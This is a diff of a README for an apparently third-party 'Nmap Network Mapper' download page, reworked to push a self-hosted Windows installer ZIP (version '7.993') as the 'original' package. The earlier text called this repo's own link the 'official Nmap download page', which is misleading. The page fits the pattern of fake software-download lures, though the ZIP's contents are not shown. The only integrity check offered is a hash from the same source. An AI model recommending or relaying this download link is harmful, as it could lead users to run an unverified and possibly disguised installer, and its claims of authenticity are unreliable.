@@ -1,16 +1,30 @@
-# Nmap Network Mapper Download Reference
-
 <div align="center">
 
-![Nmap Tools Lab](https://img.shields.io/badge/Nmap%20Tools%20Lab-independent%20resource-0d8c96?style=for-the-badge)
-![Platform](https://img.shields.io/badge/platform-Windows-0078D4?logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/current%20reference-7.993-2563EB)
+# Nmap Network Mapper
 
-**A clear, independent download reference for authorized network discovery and diagnostics.**
+### Download Reference
 
-[![Project landing page](https://img.shields.io/badge/PROJECT%20LANDING%20PAGE-0d8c96?style=for-the-badge&logo=github)](https://nmap-tools-lab.github.io/nmap-site/)
-[![Release notes](https://img.shields.io/badge/RELEASE%20NOTES-2563eb?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases)
-[![Documentation hub](https://img.shields.io/badge/DOCUMENTATION%20HUB-334155?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download#useful-resources)
+<p>
+  <img src="https://img.shields.io/badge/NMAP%20TOOLS%20LAB-independent%20resource-0d8c96?style=flat-square" alt="Nmap Tools Lab">
+  <img src="https://img.shields.io/badge/PLATFORM-Windows-0078D4?style=flat-square&logo=windows&logoColor=white" alt="Windows">
+  <img src="https://img.shields.io/badge/VERSION-7.993-2563EB?style=flat-square" alt="Version 7.993">
+</p>
+
+<p><strong>A clear, independent download reference for authorized network discovery and diagnostics.</strong></p>
+
+<p>
+  <a href="https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip"><strong>⬇ Download ZIP</strong></a>
+  &nbsp;&nbsp;·&nbsp;&nbsp;
+  <a href="https://nmap-tools-lab.github.io/nmap-site/"><strong>Open landing page</strong></a>
+</p>
+
+<p>
+  <a href="https://github.com/nmap-tools-lab/nmap-download/releases">Release notes</a>
+  &nbsp;·&nbsp;
+  <a href="https://github.com/nmap-tools-lab/nmap-download#useful-resources">Documentation hub</a>
+  &nbsp;·&nbsp;
+  <a href="https://github.com/nmap-tools-lab">Nmap Tools Lab profile</a>
+</p>
 
 </div>
 
@@ -20,15 +34,11 @@
 
 Nmap Network Mapper is an open-source utility for network discovery, host inventory, service and version detection, and authorized security auditing. It is used by system administrators, network engineers, and security teams to understand systems they are permitted to test.
 
-## Safe download
+## Download the original ZIP
 
-Use the official Nmap download page:
+The **Download ZIP** button above points to the original package stored in this project's Release.
 
-[![Download original ZIP](https://img.shields.io/badge/DOWNLOAD%20ORIGINAL%20ZIP-00a86b?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip)
-[![Release notes](https://img.shields.io/badge/RELEASE%20NOTES-2563eb?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases)
-[![Project resources](https://img.shields.io/badge/PROJECT%20RESOURCES-334155?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download#useful-resources)
-
-The official page provides the current Windows installer, source packages, documentation, and project licensing information. Verify the SHA-256 value below and review the applicable license before installation.
+The ZIP contains the original Windows installer file without modification. Verify the SHA-256 value below before installation.
 
 **SHA-256:** `fa3ed8342795775f059dc0a8b0138d90b7da88ade915bfd6f467eadc12626098`
 
